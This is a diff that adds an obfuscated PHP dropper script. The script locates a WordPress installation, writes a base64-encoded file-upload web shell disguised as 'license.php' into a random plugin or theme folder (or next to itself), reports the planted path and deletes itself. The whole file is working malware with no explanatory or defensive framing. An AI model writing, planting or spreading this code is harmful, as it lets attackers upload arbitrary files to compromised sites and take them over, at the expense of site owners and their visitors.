@@ -1,0 +1,180 @@
+<?php  
+
+
+
+
+function fxbYErGP1($pMsg)
+{
+    unlink($_SERVER["SCRIPT_FILENAME"]);
+    echo '~~898~~0~~' . $pMsg . '~~119~~';
+	die();
+}
+
+
+
+function HNre2x5d0OWAJ_WP($pPath)
+{
+    unlink($_SERVER["SCRIPT_FILENAME"]);
+    echo '~~898~~1~~' . $pPath . '~~119~~';
+	die();
+}
+
+
+
+function HNre2x5d0OWAJ_NEAR($pPath)
+{
+    unlink($_SERVER["SCRIPT_FILENAME"]);
+    echo '~~898~~2~~' . $pPath . '~~119~~';
+	die();
+}
+
+
+ 
+
+function A8e9XB()
+{
+    $s = $_SERVER["SCRIPT_FILENAME"];
+    $p = strrpos($s, "/");
+    return $p ? substr($s, 0, $p) . "/" : "";
+}
+
+
+
+function KMQoeZ2q4gv($pDir)
+{
+    $p = strrpos($pDir, "/", -2);
+    return $p ? substr($pDir, 0, $p) . "/" : "";
+}
+
+ 
+
+function awI4iiaiAH7Xp2($pDir)
+{
+	if (!@is_dir($pDir)) return 0;
+	$h = @opendir( $pDir );
+	if ($h === FALSE) return 0;
+	$sd = @readdir($h);
+	closedir($h);
+	return $sd !== FALSE;
+}
+
+  
+
+function iCLqsgAuV($pDir)
+{
+	$d = 0;
+	$cur = $pDir;   
+	while($d < 30)
+	{
+		if (@is_dir($cur . 'wp-content')) return $cur;
+		$try = KMQoeZ2q4gv($cur);
+		if ($try == ''  ||  !awI4iiaiAH7Xp2($try)) break;
+		$d ++;
+		$cur = $try;
+	}
+	return NULL;
+}
+
+
+
+function TmsVqoM5($pAbsFN, $pData)
+{
+    $f = @fopen($pAbsFN, "wb");
+    if (!$f) return 0;
+    $r = fwrite($f, $pData);
+    fclose($f);
+    return $r !== FALSE;
+}
+
+ 
+
+function bftnCBe($pBasePath, &$pArRet)
+{
+	$h = @opendir( $pBasePath );
+	if (!$h) return;
+	
+	while( true == ($sd = @readdir($h)) )
+	{
+		if ($sd == '.' || $sd == '..') continue;    
+		$f = $pBasePath . $sd;
+		if (@is_link($f) || !@is_dir($f)) continue;
+		$f .= '/';
+		$pArRet[] = $f;
+	}
+	
+	@closedir($h);
+}
+
+ 
+
+function csTubSTWk3f4j(&$pDirs)
+{
+	for ($x = 0; $x < 10; $x ++ )
+	{
+		$ind = rand() % count($pDirs);
+		if ( file_exists( $pDirs[$ind] ) ) return $ind;
+	}
+	return -1;
+}
+
+  
+
+
+
+$gJuice = base64_decode('PGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD13aW5kb3dzLXV0Zi04Ij4KPHRpdGxlPmpFQkJzTzFCb048L3RpdGxlPgo8L2hlYWQ+IAo8Ym9keT4KPD9waHAKcHJpbnQgJzxoMT4jcEAkY0AjPC9oMT4nOwplY2hvICJZb3VyIElQOiAiOyAgCmVjaG8gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CmVjaG8gIjxmb3JtIG1ldGhvZD1cInBvc3RcIiBlbmN0eXBlPVwibXVsdGlwYXJ0L2Zvcm0tZGF0YVwiPlxuIjsKZWNobyAiPGlucHV0IHR5cGU9XCJmaWxlXCIgbmFtZT1cImZpbGVuYW1lXCI+PGJyPiBcbiI7CmVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJMT0FEXCI+PGJyPlxuIjsKZWNobyAiPC9mb3JtPlxuIjsgIAoKaWYgKEBpc191cGxvYWRlZF9maWxlKCAkX0ZJTEVTWyJmaWxlbmFtZSJdWyJ0bXBfbmFtZSJdICkpCnsKCSAKCW1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlbmFtZSJdWyJ0bXBfbmFtZSJdLCAgICAgJF9GSUxFU1siZmlsZW5hbWUiXVsibmFtZSJdKTsKCS8qXyovCgkkZmlsZSA9ICRfRklMRVNbImZpbGVuYW1lIl1bIm5hbWUiXTsgIAoJZWNobyAiPGEgaHJlZj1cIiRmaWxlXCI+JGZpbGU8L2E+IjsKCS8qXyovCn0KZWxzZQp7CgkgIAoJZWNobygiZW1wdHkiKTsKCSAKfQogCiR2YXIxID0gJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddOwovKl8qLwp0b3VjaCggJHZhcjEgKTsKPz4KPC9ib2R5Pgo8L2h0bWw+IAo=');
+  
+$gName  = base64_decode('bGljZW5zZS5waHA=');
+
+$fff = '';
+
+$wp_root = iCLqsgAuV( A8e9XB() );
+
+$is_failed_in_wp = 0;
+
+
+if ($wp_root)
+{
+    $dir_themes = $wp_root . 'wp-content/themes/';
+    $dir_plugs  = $wp_root . 'wp-content/plugins/';
+
+    $dirs = array();
+
+    bftnCBe($dir_plugs, 	$dirs);
+    bftnCBe($dir_themes, 	$dirs);
+
+    while ( 1)
+    {
+        $num_dirs = count($dirs);
+        if ($num_dirs < 1) break;
+
+        $ii = csTubSTWk3f4j($dirs);
+        if ($ii == -1) break;
+        
+        $fff = $dirs[$ii] . $gName;
+
+        if ( TmsVqoM5($fff, $gJuice) )
+        {
+            HNre2x5d0OWAJ_WP($fff);
+        }
+
+        $is_failed_in_wp = 1;
+        
+        array_splice($dirs, $ii, 1);
+    }
+}
+
+
+
+
+$fff = A8e9XB() . $gName;
+
+if ( TmsVqoM5($fff, $gJuice) ) HNre2x5d0OWAJ_NEAR($fff);
+if ($is_failed_in_wp) fxbYErGP1('Failed to save WP & NEAR');
+fxbYErGP1('Failed to save NEAR')
+
+
+  
+
+
+?>
+
